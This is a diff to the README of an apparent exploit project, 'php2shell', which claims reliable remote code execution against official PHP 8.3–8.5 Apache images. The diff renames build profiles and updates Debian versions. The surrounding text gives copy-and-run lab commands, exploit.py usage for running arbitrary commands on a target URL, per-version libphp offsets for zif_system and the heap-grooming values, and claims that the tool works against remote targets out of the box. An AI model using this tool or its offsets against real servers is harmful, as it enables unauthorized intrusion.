@@ -87,7 +87,7 @@ The block below goes from zero to RCE. Copy and run it as-is.
 git clone https://github.com/3em0/php2shell.git
 cd php2shell
 
-# 1) Pull the official image (PHP 8.4.26 / Debian 12 / Apache prefork)
+# 1) Pull the official image (PHP 8.4.26 / Debian 13 / Apache prefork)
 docker compose -f docker/docker-compose.yml pull
 
 # 2) Start the target: single worker, display_errors=On, memory_limit=8M
@@ -112,14 +112,14 @@ container's `libphp.so` and caches them in `out/offsets.env`.
 
 ## Reproduction status
 
-Measured live on the official PHP `-apache` images (all Debian 12 bookworm), `linux/amd64`, using
+Measured live on the official PHP `-apache` images (all Debian 13 trixie), `linux/amd64`, using
 the shipped `docker/` lab with `PHP_IMAGE` pointed at each version:
 
 | PHP version | Profile | libphp offsets | Stage 1–2 leaks | Stage 3 RCE |
 | --- | --- | --- | --- | --- |
-| **8.3.35** | `bookworm83` (auto on localhost) | auto `0x3ac080` / `0x49ec50` | reliable | ✅ **8 / 8** one-shot |
-| **8.4.26** | `bookworm` (default) | auto `0x465370` / `0x65eb60` | reliable | ✅ **3 / 3** one-shot |
-| **8.5.11** | `bookworm` (default) | auto `0x5996e0` / `0x7b47a0` | reliable | ✅ **6 / 6** one-shot |
+| **8.3.35** | `official83` (auto on localhost) | auto `0x3ac080` / `0x49ec50` | reliable | ✅ **8 / 8** one-shot |
+| **8.4.26** | `official` (default) | auto `0x465370` / `0x65eb60` | reliable | ✅ **3 / 3** one-shot |
+| **8.5.11** | `official` (default) | auto `0x5996e0` / `0x7b47a0` | reliable | ✅ **6 / 6** one-shot |
 
 The libphp symbol offsets are read from each image at runtime, so only the chunk-relative `htdata`
 offset is version-specific: `0x690d8` for 8.4/8.5, `0x6a0d8` for 8.3. Point the lab at another version
@@ -180,8 +180,8 @@ them depend on ASLR**. The `stage*` fields groom the heap and differ per build.
 
 | Profile | Target build | `zif_system` | `ZVAL_PTR_DTOR` | `htdata` | stage1 / stage2 |
 | --- | --- | --- | --- | --- | --- |
-| **`bookworm`** (default) | official `php:8.4`/`8.5-apache` (Debian 12) | `0x465370` | `0x65eb60` | `0x690d8` | `n=841`, `t=406`, `v=16` |
-| `bookworm83` | official `php:8.3-apache` (Debian 12) | `0x3ac080` | `0x49ec50` | `0x6a0d8` | `n=841`, `t=406`, `v=16` |
+| **`official`** (default) | official `php:8.4`/`8.5-apache` (Debian 13) | `0x465370` | `0x65eb60` | `0x690d8` | `n=841`, `t=406`, `v=16` |
+| `official83` | official `php:8.3-apache` (Debian 13) | `0x3ac080` | `0x49ec50` | `0x6a0d8` | `n=841`, `t=406`, `v=16` |
 | `lab` | self-built (Apache 2.4.68, minimal PHP) | `0x43a870` | `0x613c50` | `0x6e0d8` | `n=892`, `t=443`, `v=1` |
 
 Offset resolution precedence (highest first):
@@ -194,13 +194,13 @@ Offset resolution precedence (highest first):
 Two conveniences make multi-version use zero-config:
 
 - **Version-aware `htdata`.** On a localhost container the exploit reads the PHP minor version and,
-  on the default profile, automatically uses the `bookworm83` `htdata` for 8.3 — so the same command
+  on the default profile, automatically uses the `official83` `htdata` for 8.3 — so the same command
   fits 8.3 / 8.4 / 8.5 with no flags.
 - **Own libphp defaults per profile.** Each profile carries its own correct libphp defaults, so it
   also works against a **remote** target of that build out of the box, even when `docker/offsets.py`
   cannot run (it only reaches a localhost container).
 
-Switch profile with `--profile bookworm83` / `--profile lab`; disable auto-derivation with
+Switch profile with `--profile official83` / `--profile lab`; disable auto-derivation with
 `--offsets-file '' --no-auto-offsets`.
 
 ## Running arbitrary commands
@@ -220,7 +220,7 @@ python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'sh</out/c'
 | --- | --- | --- |
 | `-u`, `--url` | *(required)* | Target PHP page, e.g. `http://127.0.0.1:8088/index.php` |
 | `-c`, `--cmd` | `id>/out/p1` | Command to execute (max 14 bytes) |
-| `--profile` | `bookworm` | Build profile: `bookworm` (8.4/8.5), `bookworm83` (8.3), or `lab` |
+| `--profile` | `official` | Build profile: `official` (8.4/8.5), `official83` (8.3), or `lab` |
 | `--proof-file` | `out/p1` | Local file read back after exploitation (`''` disables) |
 | `--fetch` | *(off)* | `GET` this path afterwards (for commands writing to the web root) |
 | `--zif-offset` / `--dtor-offset` / `--htdata-offset` | *(profile)* | Override individual offsets |
@@ -239,7 +239,7 @@ The shipped lab mirrors the settings the chain depends on
 | Component | Value |
 | --- | --- |
 | PHP | 8.4.26 (NTS, mod_php) |
-| Base OS | Debian 12 (bookworm) |
+| Base OS | Debian 13 (trixie) |
 | Apache MPM | prefork, **single worker** |
 | `display_errors` | `On` |
 | `memory_limit` | `8M` |
@@ -279,6 +279,10 @@ php2shell/
 - Reliable RCE is verified on PHP **8.3 / 8.4 / 8.5** (official `-apache` images, `linux/amd64`). Other
   point releases of the same minor are expected to work (libphp offsets auto-derive), but are not
   individually tested.
+- **PHP 8.1 / 8.2 are not supported.** On the current `php:8.1-apache` and `php:8.2-apache` images the
+  stage-1 heap-leak primitive does not fire with this grooming (the chain never recovers the chunk
+  base), so the exploit stops before any leak. Supporting them would require re-calibrating stage 1
+  for those versions.
 - A pure-HTTP heap leak works with `display_errors=0`; the complete RCE for that configuration is not
   included here (see [docs/DISPLAY_ERRORS_OFF.md](docs/DISPLAY_ERRORS_OFF.md)).
 - The offsets are x86-64; a different architecture or a rebuilt `libphp.so` shifts them (use
